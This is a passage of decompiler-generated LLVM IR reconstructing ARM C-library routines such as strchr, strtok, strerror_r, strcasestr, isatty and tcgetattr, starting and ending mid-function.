  %v1_15cc4 = add i32 %v2_15cc0, -1
  store i32 %v1_15cc4, i32* %r3.global-to-local, align 4
  %v7_15cc4 = icmp eq i32 %v2_15cc0, 1
  store i1 %v7_15cc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15cc4, label %dec_label_pc_15d00, label %dec_label_pc_15cf0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15cac, %entry
  %v2_15ce07 = phi i32 [ %v1_15c54, %entry ], [ %v6_15ca0, %dec_label_pc_15cac ]
  %v1_15cd0 = urem i32 %arg2, 4
  store i32 %v1_15cd0, i32* %r3.global-to-local, align 4
  %v2_15cd0 = icmp eq i32 %v1_15cd0, 0
  store i1 %v2_15cd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15cd0, label %dec_label_pc_15d00, label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cd0, %dec_label_pc_15ce8.dec_label_pc_15cd8_crit_edge
  %v2_15ce0 = phi i32 [ %v6_15ce0, %dec_label_pc_15ce8.dec_label_pc_15cd8_crit_edge ], [ %v2_15ce07, %dec_label_pc_15cd0 ]
  %v0_15cdc = phi i32 [ %v0_15cdc.pre, %dec_label_pc_15ce8.dec_label_pc_15cd8_crit_edge ], [ %v1_15cd0, %dec_label_pc_15cd0 ]
  %v0_15cd8 = load i32, i32* @r1, align 4
  %v1_15cd8 = inttoptr i32 %v0_15cd8 to i8*
  %v2_15cd8 = load i8, i8* %v1_15cd8, align 1
  %v3_15cd8 = zext i8 %v2_15cd8 to i32
  store i32 %v3_15cd8, i32* %r2.global-to-local, align 4
  %v5_15cd8 = add i32 %v0_15cd8, 1
  store i32 %v5_15cd8, i32* @r1, align 4
  %v1_15cdc = add i32 %v0_15cdc, -1
  store i32 %v1_15cdc, i32* %r3.global-to-local, align 4
  %v7_15cdc = icmp eq i32 %v0_15cdc, 1
  store i1 %v7_15cdc, i1* %cpsr_z.global-to-local, align 1
  %v3_15ce0 = add i32 %v2_15ce0, 1
  %v4_15ce0 = inttoptr i32 %v3_15ce0 to i8*
  store i8 %v2_15cd8, i8* %v4_15ce0, align 1
  %v5_15ce0 = load i32, i32* @ip, align 4
  %v6_15ce0 = add i32 %v5_15ce0, 1
  store i32 %v6_15ce0, i32* @ip, align 4
  %v0_15ce4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15ce4, label %dec_label_pc_15d00, label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15cd8
  %v0_15ce8 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ce8 = icmp eq i32 %v0_15ce8, 0
  store i1 %v2_15ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15ce8, label %dec_label_pc_15cf0, label %dec_label_pc_15ce8.dec_label_pc_15cd8_crit_edge

dec_label_pc_15ce8.dec_label_pc_15cd8_crit_edge:  ; preds = %dec_label_pc_15ce8
  %v0_15cdc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15cd8

dec_label_pc_15cf0:                               ; preds = %dec_label_pc_15ce8, %dec_label_pc_15cbc
  %v2_15cf810 = phi i32 [ %v1_15cbc, %dec_label_pc_15cbc ], [ %v6_15ce0, %dec_label_pc_15ce8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cf4

dec_label_pc_15cf4:                               ; preds = %dec_label_pc_15cf4.dec_label_pc_15cf4_crit_edge, %dec_label_pc_15cf0
  %v2_15cf8 = phi i32 [ %v6_15cf8, %dec_label_pc_15cf4.dec_label_pc_15cf4_crit_edge ], [ %v2_15cf810, %dec_label_pc_15cf0 ]
  %v0_15cf8.off0 = phi i8 [ %extract.t, %dec_label_pc_15cf4.dec_label_pc_15cf4_crit_edge ], [ 0, %dec_label_pc_15cf0 ]
  %v0_15cf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_15cf4 = add i32 %v0_15cf4, -1
  store i32 %v1_15cf4, i32* %r3.global-to-local, align 4
  %v7_15cf4 = icmp eq i32 %v0_15cf4, 1
  store i1 %v7_15cf4, i1* %cpsr_z.global-to-local, align 1
  %v3_15cf8 = add i32 %v2_15cf8, 1
  %v4_15cf8 = inttoptr i32 %v3_15cf8 to i8*
  store i8 %v0_15cf8.off0, i8* %v4_15cf8, align 1
  %v5_15cf8 = load i32, i32* @ip, align 4
  %v6_15cf8 = add i32 %v5_15cf8, 1
  store i32 %v6_15cf8, i32* @ip, align 4
  %v0_15cfc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15cfc, label %dec_label_pc_15d00, label %dec_label_pc_15cf4.dec_label_pc_15cf4_crit_edge

dec_label_pc_15cf4.dec_label_pc_15cf4_crit_edge:  ; preds = %dec_label_pc_15cf4
  %v0_15cf8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_15cf8.pre to i8
  br label %dec_label_pc_15cf4

dec_label_pc_15d00:                               ; preds = %dec_label_pc_15cd8, %dec_label_pc_15cf4, %dec_label_pc_15cbc, %dec_label_pc_15cd0
  %v2_15d00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_15d00, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_15cf8, { 1, 0 }
  uselistorder i32 %v0_15cf4, { 1, 0 }
  uselistorder i32 %v6_15ce0, { 0, 2, 1 }
  uselistorder i32 %v1_15cd0, { 2, 1, 0 }
  uselistorder i32 %v2_15cc0, { 1, 0 }
  uselistorder i32 %v1_15cb0, { 1, 0 }
  uselistorder i32 %v0_15cac, { 1, 0 }
  uselistorder i32 %v6_15ca0, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15d00, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_15cd8, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15d0c = urem i32 %arg1, 256
  %v0_15d2c3 = load i32, i32* @r0, align 4
  %v1_15d2c4 = urem i32 %v0_15d2c3, 4
  %v2_15d2c5 = icmp eq i32 %v1_15d2c4, 0
  br i1 %v2_15d2c5, label %dec_label_pc_15d34, label %dec_label_pc_15d14

dec_label_pc_15d14:                               ; preds = %entry, %dec_label_pc_15d28
  %v0_15d28 = phi i32 [ %v1_15d28, %dec_label_pc_15d28 ], [ %v0_15d2c3, %entry ]
  %v1_15d14 = inttoptr i32 %v0_15d28 to i8*
  %v2_15d14 = load i8, i8* %v1_15d14, align 1
  %v3_15d14 = zext i8 %v2_15d14 to i32
  store i32 %v3_15d14, i32* @r3, align 4
  %v9_15d18 = icmp eq i32 %v3_15d14, %v1_15d0c
  br i1 %v9_15d18, label %dec_label_pc_15de8, label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15d14
  %v2_15d20 = icmp eq i8 %v2_15d14, 0
  br i1 %v2_15d20, label %dec_label_pc_15de4, label %dec_label_pc_15d28

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15d20
  %v1_15d28 = add i32 %v0_15d28, 1
  %v1_15d2c = urem i32 %v1_15d28, 4
  %v2_15d2c = icmp eq i32 %v1_15d2c, 0
  br i1 %v2_15d2c, label %dec_label_pc_15d34, label %dec_label_pc_15d14

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d28, %entry
  %v0_15d38 = phi i32 [ %v0_15d2c3, %entry ], [ %v1_15d28, %dec_label_pc_15d28 ]
  %v4_15d34 = mul nuw nsw i32 %v1_15d0c, 256
  %v5_15d34 = or i32 %v4_15d34, %v1_15d0c
  %v4_15d3c = mul i32 %v5_15d34, 65536
  %v5_15d3c = or i32 %v4_15d3c, %v5_15d34
  br label %dec_label_pc_15d40

dec_label_pc_15d40:                               ; preds = %dec_label_pc_15ddc, %dec_label_pc_15d7c, %dec_label_pc_15d34
  %v0_15da4 = phi i32 [ %v0_15d38, %dec_label_pc_15d34 ], [ %v4_15d40, %dec_label_pc_15d7c ], [ %v4_15d40, %dec_label_pc_15ddc ]
  %v1_15d40 = inttoptr i32 %v0_15da4 to i32*
  %v2_15d40 = load i32, i32* %v1_15d40, align 4
  %v4_15d40 = add i32 %v0_15da4, 4
  %v2_15d48 = xor i32 %v2_15d40, %v5_15d3c
  %v2_15d4c = add i32 %v2_15d48, 2130640639
  store i32 %v2_15d4c, i32* @ip, align 4
  %v2_15d54 = add i32 %v2_15d40, 2130640639
  %v1_15d58 = sub i32 -1, %v2_15d40
  %v2_15d5c = xor i32 %v2_15d54, %v1_15d58
  %v2_15d68 = and i32 %v2_15d5c, -2130640640
  %v2_15d70 = icmp eq i32 %v2_15d68, 0
  br i1 %v2_15d70, label %dec_label_pc_15d7c, label %dec_label_pc_15d84

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d40
  %v1_15d64 = sub i32 -1, %v2_15d48
  %v2_15d6c = xor i32 %v2_15d4c, %v1_15d64
  %v2_15d74 = and i32 %v2_15d6c, -2130640640
  %v2_15d7c = icmp eq i32 %v2_15d74, 0
  br i1 %v2_15d7c, label %dec_label_pc_15d40, label %dec_label_pc_15d84

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d40, %dec_label_pc_15d7c
  %v2_15d84 = inttoptr i32 %v0_15da4 to i8*
  %v3_15d84 = load i8, i8* %v2_15d84, align 1
  %v4_15d84 = zext i8 %v3_15d84 to i32
  store i32 %v4_15d84, i32* @r3, align 4
  %v9_15d88 = icmp eq i32 %v4_15d84, %v1_15d0c
  br i1 %v9_15d88, label %dec_label_pc_15de8, label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15d84
  %v2_15d94 = icmp eq i8 %v3_15d84, 0
  br i1 %v2_15d94, label %dec_label_pc_15de4, label %dec_label_pc_15d9c

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d94
  %v1_15d9c = add i32 %v0_15da4, 1
  %v2_15d9c = inttoptr i32 %v1_15d9c to i8*
  %v3_15d9c = load i8, i8* %v2_15d9c, align 1
  %v4_15d9c = zext i8 %v3_15d9c to i32
  store i32 %v4_15d9c, i32* @r3, align 4
  %v9_15da0 = icmp eq i32 %v4_15d9c, %v1_15d0c
  br i1 %v9_15da0, label %dec_label_pc_15de8, label %dec_label_pc_15dac

dec_label_pc_15dac:                               ; preds = %dec_label_pc_15d9c
  %v2_15dac = icmp eq i8 %v3_15d9c, 0
  br i1 %v2_15dac, label %dec_label_pc_15de4, label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15dac
  %v1_15db4 = add i32 %v0_15da4, 2
  %v2_15db4 = inttoptr i32 %v1_15db4 to i8*
  %v3_15db4 = load i8, i8* %v2_15db4, align 1
  %v4_15db4 = zext i8 %v3_15db4 to i32
  store i32 %v4_15db4, i32* @r3, align 4
  %v9_15db8 = icmp eq i32 %v4_15db4, %v1_15d0c
  br i1 %v9_15db8, label %dec_label_pc_15de8, label %dec_label_pc_15dc4

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15db4
  %v2_15dc4 = icmp eq i8 %v3_15db4, 0
  br i1 %v2_15dc4, label %dec_label_pc_15de4, label %dec_label_pc_15dcc

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15dc4
  %v1_15dcc = add i32 %v0_15da4, 3
  %v2_15dcc = inttoptr i32 %v1_15dcc to i8*
  %v3_15dcc = load i8, i8* %v2_15dcc, align 1
  %v4_15dcc = zext i8 %v3_15dcc to i32
  store i32 %v4_15dcc, i32* @r3, align 4
  %v9_15dd0 = icmp eq i32 %v4_15dcc, %v1_15d0c
  br i1 %v9_15dd0, label %dec_label_pc_15de8, label %dec_label_pc_15ddc

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15dcc
  %v2_15ddc = icmp eq i8 %v3_15dcc, 0
  br i1 %v2_15ddc, label %dec_label_pc_15de4, label %dec_label_pc_15d40

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15d20, %dec_label_pc_15ddc, %dec_label_pc_15dc4, %dec_label_pc_15dac, %dec_label_pc_15d94
  br label %dec_label_pc_15de8

dec_label_pc_15de8:                               ; preds = %dec_label_pc_15d14, %dec_label_pc_15dcc, %dec_label_pc_15db4, %dec_label_pc_15d9c, %dec_label_pc_15d84, %dec_label_pc_15de4
  %v1_15dec = phi i32 [ 0, %dec_label_pc_15de4 ], [ %v1_15dcc, %dec_label_pc_15dcc ], [ %v1_15db4, %dec_label_pc_15db4 ], [ %v1_15d9c, %dec_label_pc_15d9c ], [ %v0_15da4, %dec_label_pc_15d84 ], [ %v0_15d28, %dec_label_pc_15d14 ]
  ret i32 %v1_15dec

; uselistorder directives
  uselistorder i32 %v4_15d40, { 1, 0 }
  uselistorder i32 %v2_15d40, { 0, 2, 1 }
  uselistorder i32 %v0_15da4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15d34, { 1, 0 }
  uselistorder i32 %v1_15d28, { 1, 0, 2 }
  uselistorder i32 %v0_15d2c3, { 2, 1, 0 }
  uselistorder i32 %v1_15d0c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_15de8, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15de4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_15d84, { 1, 0 }
  uselistorder label %dec_label_pc_15d14, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15e00 = call i32 @__xpg_strerror_r()
  %v0_15e04 = load i32, i32* @r4, align 4
  ret i32 %v0_15e04
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 25796), i32* @r2, align 4
  %v0_15e28 = call i32 @strtok_r()
  ret i32 %v0_15e28
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_15e40 = load i32, i32* @r4, align 4
  %v9_15e40 = load i32, i32* @r6, align 4
  %v0_15e48 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  store i32 %v0_15e48, i32* @ip, align 4
  %v0_15e58 = load i32, i32* @r1, align 4
  store i32 %v0_15e58, i32* @r7, align 4
  %v0_15e5c = load i32, i32* @r2, align 4
  store i32 %v0_15e5c, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_15e48, 124
  br i1 %tmp, label %dec_label_pc_15e94, label %dec_label_pc_15e64

dec_label_pc_15e64:                               ; preds = %entry
  br label %dec_label_pc_15e7c

dec_label_pc_15e70:                               ; preds = %dec_label_pc_15e7c
  br i1 %v2_15e88, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_15e70
  %v2_15e74 = add i32 %v1_15e8c, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_15e70, %bb
  %v0_15e7c1 = phi i32 [ %v1_15e8c, %dec_label_pc_15e70 ], [ %v2_15e74, %bb ]
  %v1_15e78 = add i32 %v0_15e78, 1
  br label %dec_label_pc_15e7c

dec_label_pc_15e7c:                               ; preds = %dec_label_pc_15e64, %bb15
  %v1_15e8c = phi i32 [ %v0_15e48, %dec_label_pc_15e64 ], [ %v0_15e7c1, %bb15 ]
  %v0_15e78 = phi i32 [ add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -37048), %dec_label_pc_15e64 ], [ %v1_15e78, %bb15 ]
  store i32 %v0_15e78, i32* @r5, align 4
  %v2_15e7c = icmp eq i32 %v1_15e8c, 0
  %v1_15e80 = inttoptr i32 %v0_15e78 to i8*
  %v2_15e80 = load i8, i8* %v1_15e80, align 1
  %v3_15e80 = zext i8 %v2_15e80 to i32
  store i32 %v3_15e80, i32* @r3, align 4
  %v2_15e88 = icmp eq i8 %v2_15e80, 0
  br i1 %v2_15e7c, label %dec_label_pc_15e88, label %dec_label_pc_15e70

dec_label_pc_15e88:                               ; preds = %dec_label_pc_15e7c
  br i1 %v2_15e88, label %dec_label_pc_15e94, label %bb16

bb16:                                             ; preds = %dec_label_pc_15e88
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ed0

dec_label_pc_15e94:                               ; preds = %dec_label_pc_15e88, %entry
  store i32 %v0_15e48, i32* @r2, align 4
  %v3_15e9c = ashr i32 %v0_15e48, 31
  store i32 %v3_15e9c, i32* @r3, align 4
  %v6_15eb0 = bitcast i32* %stack_var_-25 to i8*
  %v7_15eb0 = call i32 @_uintmaxtostr(i8* %v6_15eb0)
  %v1_15eb8 = add i32 %v7_15eb0, -14
  store i32 %v1_15eb8, i32* @r5, align 4
  %v0_15ebc = load i32, i32* @r6, align 4
  %v2_15ebc = add i32 %v0_15ebc, -37064
  store i32 %v2_15ebc, i32* @r1, align 4
  store i32 %v1_15eb8, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_15ec8 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_15ed0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15ed0

dec_label_pc_15ed0:                               ; preds = %bb16, %dec_label_pc_15e94
  %v0_15ed0 = phi i32 [ %v0_15e78, %bb16 ], [ %v0_15ed0.pre, %dec_label_pc_15e94 ]
  %v1_15ed0 = inttoptr i32 %v0_15ed0 to i8*
  %v3_15ed4 = call i32 @strlen(i8* %v1_15ed0)
  %v0_15ed8 = load i32, i32* @r7, align 4
  %v2_15ed8 = icmp eq i32 %v0_15ed8, 0
  br i1 %v2_15ed8, label %bb17, label %dec_label_pc_15ed0._crit_edge

dec_label_pc_15ed0._crit_edge:                    ; preds = %dec_label_pc_15ed0
  %v1_15ee4.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_15ed0
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15ed0._crit_edge, %bb17
  %v1_15ee4 = phi i32 [ %v1_15ee4.pre, %dec_label_pc_15ed0._crit_edge ], [ 0, %bb17 ]
  %v1_15ee0 = add i32 %v3_15ed4, 1
  %v3_15ee4 = icmp uge i32 %v1_15ee0, %v1_15ee4
  %v9_15ee4 = icmp eq i32 %v1_15ee0, %v1_15ee4
  %v2_15ee8 = xor i1 %v3_15ee4, true
  %v3_15ee8 = or i1 %v9_15ee4, %v2_15ee8
  br i1 %v3_15ee8, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_15ee0, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_15ef8 = phi i32 [ %v1_15ee4, %bb18 ], [ %v1_15ee0, %bb19 ]
  %v2_15eec = xor i1 %v9_15ee4, true
  %v3_15eec = and i1 %v3_15ee4, %v2_15eec
  br i1 %v3_15eec, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_15ef0 = icmp eq i32 %v0_15ef8, 0
  br i1 %v2_15ef0, label %dec_label_pc_15f14, label %dec_label_pc_15ef8

dec_label_pc_15ef8:                               ; preds = %bb22
  store i32 %v0_15ef8, i32* @r2, align 4
  %v0_15efc = load i32, i32* @r5, align 4
  store i32 %v0_15efc, i32* @r1, align 4
  store i32 %v0_15ed8, i32* @r0, align 4
  %v0_15f04 = call i32 @memcpy()
  %v0_15f08 = load i32, i32* @r4, align 4
  %v1_15f08 = load i32, i32* @r7, align 4
  %v2_15f08 = add i32 %v1_15f08, %v0_15f08
  %v3_15f10 = add i32 %v2_15f08, -1
  %v4_15f10 = inttoptr i32 %v3_15f10 to i8*
  store i8 0, i8* %v4_15f10, align 1
  br label %dec_label_pc_15f14

dec_label_pc_15f14:                               ; preds = %bb22, %dec_label_pc_15ef8
  %v0_15f14 = load i32, i32* %r6.global-to-local, align 4
  %v2_15f14 = icmp eq i32 %v0_15f14, 0
  br i1 %v2_15f14, label %dec_label_pc_15f24, label %dec_label_pc_15f1c

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f14
  %v0_15f1c = call i32 @__GI___errno_location()
  %v0_15f20 = load i32, i32* %r6.global-to-local, align 4
  %v2_15f20 = inttoptr i32 %v0_15f1c to i32*
  store i32 %v0_15f20, i32* %v2_15f20, align 4
  %v0_15f24.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = mul i32 %v0_15f24.pre, 65536
  %phitmp23 = sdiv i32 %phitmp, 65536
  br label %dec_label_pc_15f24

dec_label_pc_15f24:                               ; preds = %dec_label_pc_15f14, %dec_label_pc_15f1c
  %v0_15f24 = phi i32 [ 0, %dec_label_pc_15f14 ], [ %phitmp23, %dec_label_pc_15f1c ]
  store i32 %v3_15e40, i32* @r4, align 4
  store i32 %v9_15e40, i32* %r6.global-to-local, align 4
  ret i32 %v0_15f24

; uselistorder directives
  uselistorder i1 %v3_15ee4, { 1, 0 }
  uselistorder i32 %v0_15e78, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15e8c, { 1, 0, 2 }
  uselistorder i32 %v0_15e48, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_15f24, { 1, 0 }
  uselistorder label %dec_label_pc_15f14, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15ed0, { 1, 0 }
  uselistorder label %dec_label_pc_15e7c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_15f4c = load i32, i32* %r0.global-to-local, align 4
  %v1_15f6023 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_15f60.outer

dec_label_pc_15f60.outer:                         ; preds = %dec_label_pc_15fa0, %entry
  %v0_15fa0.ph = phi i32 [ %v1_15fa0, %dec_label_pc_15fa0 ], [ %v0_15f4c, %entry ]
  %v2_15f6024 = load i8, i8* %v1_15f6023, align 1
  %v2_15f6426 = icmp eq i8 %v2_15f6024, 0
  br i1 %v2_15f6426, label %bb, label %dec_label_pc_15f78

bb:                                               ; preds = %dec_label_pc_15f60.backedge, %dec_label_pc_15f60.outer
  store i32 %v0_15fa0.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15fb4

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f60.outer, %dec_label_pc_15f60.backedge
  %v1_15f6c32.in = phi i32 [ %v1_15f6c32, %dec_label_pc_15f60.backedge ], [ %arg2, %dec_label_pc_15f60.outer ]
  %v2_15f6030 = phi i8 [ %v2_15f60, %dec_label_pc_15f60.backedge ], [ %v2_15f6024, %dec_label_pc_15f60.outer ]
  %v2_15f6831.in.in = phi i8 [ %v2_15f60, %dec_label_pc_15f60.backedge ], [ %v2_15f6024, %dec_label_pc_15f60.outer ]
  %v0_15f8429 = phi i32 [ %v1_15f84, %dec_label_pc_15f60.backedge ], [ %v0_15fa0.ph, %dec_label_pc_15f60.outer ]
  %v1_15f6c32 = add i32 %v1_15f6c32.in, 1
  %v1_15f78 = inttoptr i32 %v0_15f8429 to i8*
  %v2_15f78 = load i8, i8* %v1_15f78, align 1
  %v3_15f78 = zext i8 %v2_15f78 to i32
  store i32 %v3_15f78, i32* %r0.global-to-local, align 4
  %v9_15f7c = icmp eq i8 %v2_15f6030, %v2_15f78
  %v1_15f84 = add i32 %v0_15f8429, 1
  br i1 %v9_15f7c, label %dec_label_pc_15f60.backedge, label %dec_label_pc_15f8c

dec_label_pc_15f60.backedge:                      ; preds = %dec_label_pc_15f78, %dec_label_pc_15f8c
  %v1_15f60 = inttoptr i32 %v1_15f6c32 to i8*
  %v2_15f60 = load i8, i8* %v1_15f60, align 1
  %v2_15f64 = icmp eq i8 %v2_15f60, 0
  br i1 %v2_15f64, label %bb, label %dec_label_pc_15f78

dec_label_pc_15f8c:                               ; preds = %dec_label_pc_15f78
  %v2_15f6831.in = zext i8 %v2_15f6831.in.in to i32
  %v2_15f80 = mul nuw nsw i32 %v3_15f78, 2
  %v2_15f6831 = mul nuw nsw i32 %v2_15f6831.in, 2
  %v4_15f8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 1124) to i32*), align 4
  %v2_15f90 = add i32 %v4_15f8c, %v2_15f80
  %v3_15f90 = inttoptr i32 %v2_15f90 to i16*
  %v4_15f90 = load i16, i16* %v3_15f90, align 2
  %v2_15f94 = add i32 %v4_15f8c, %v2_15f6831
  %v3_15f94 = inttoptr i32 %v2_15f94 to i16*
  %v4_15f94 = load i16, i16* %v3_15f94, align 2
  %v9_15f98 = icmp eq i16 %v4_15f94, %v4_15f90
  br i1 %v9_15f98, label %dec_label_pc_15f60.backedge, label %dec_label_pc_15fa0

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f8c
  %v1_15fa0 = add i32 %v0_15fa0.ph, 1
  %v2_15fa4 = icmp eq i8 %v2_15f78, 0
  br i1 %v2_15fa4, label %dec_label_pc_15fb4, label %dec_label_pc_15f60.outer

dec_label_pc_15fb4:                               ; preds = %dec_label_pc_15fa0, %bb
  %v1_15fb8 = phi i32 [ %v0_15fa0.ph, %bb ], [ 0, %dec_label_pc_15fa0 ]
  ret i32 %v1_15fb8

; uselistorder directives
  uselistorder i8 %v2_15f60, { 2, 1, 0 }
  uselistorder i32 %v0_15f8429, { 1, 0 }
  uselistorder i32 %v0_15fa0.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15f60.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_15f78, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_15fcc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_15fcc, i32* @r1, align 4
  %v0_15fd0 = call i32 @__GI_tcgetattr()
  %v1_15fd4 = sub i32 1, %v0_15fd0
  %v2_15fd4 = icmp ult i32 %v0_15fd0, 2
  br i1 %v2_15fd4, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_15fe4 = phi i32 [ %v1_15fd4, %entry ], [ 0, %bb ]
  ret i32 %v1_15fe4

; uselistorder directives
  uselistorder i32 %v0_15fd0, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_15fe8 = load i32, i32* @r4, align 4
  %v6_15fe8 = load i32, i32* @r5, align 4
  %v2_15ff0 = ptrtoint i32* %stack_var_-52 to i32
  %v0_15ff4 = load i32, i32* @r1, align 4
  store i32 %v0_15ff4, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_16000 = load i32, i32* @r0, align 4
  %v3_16000 = call i32 @ioctl(i32 %v0_16000, i32 21505, i32 %v2_15ff0)
  store i32 %v3_16000, i32* %r0.global-to-local, align 4
  store i32 %v3_16000, i32* @r5, align 4
  %v2_16004 = icmp eq i32 %v3_16000, 0
  br i1 %v2_16004, label %dec_label_pc_1600c, label %dec_label_pc_16050

dec_label_pc_1600c:                               ; preds = %entry
  %v4_16018 = zext i8 %tmp to i32
  store i32 %v4_16018, i32* @ip, align 4
  %v3_1601c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_1601c, i32* @r3, align 4
  %v1_16020 = load i32, i32* @r4, align 4
  %v2_16020 = add i32 %v1_16020, 4
  %v3_16020 = inttoptr i32 %v2_16020 to i32*
  %v0_16024 = load i32, i32* %r1.global-to-local, align 4
  %v1_16024 = load i32, i32* @r4, align 4
  %v2_16024 = add i32 %v1_16024, 8
  %v3_16024 = inttoptr i32 %v2_16024 to i32*
  store i32 %v0_16024, i32* %v3_16024, align 4
  %v0_16028 = load i32, i32* %r0.global-to-local, align 4
  %v1_16028 = load i32, i32* @r4, align 4
  %v2_16028 = add i32 %v1_16028, 12
  %v3_16028 = inttoptr i32 %v2_16028 to i32*
  store i32 %v0_16028, i32* %v3_16028, align 4
  %v2_1602c = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_1602c, i32* @r1, align 4
  %v1_16034 = load i32, i32* @r4, align 4
  %v2_16034 = inttoptr i32 %v1_16034 to i32*
  store i32 %v3_1601c, i32* %v2_16034, align 4
  %v0_16038 = load i32, i32* @ip, align 4
  %v1_16038 = trunc i32 %v0_16038 to i8
  %v2_16038 = load i32, i32* @r4, align 4
  %v3_16038 = add i32 %v2_16038, 16
  %v4_16038 = inttoptr i32 %v3_16038 to i8*
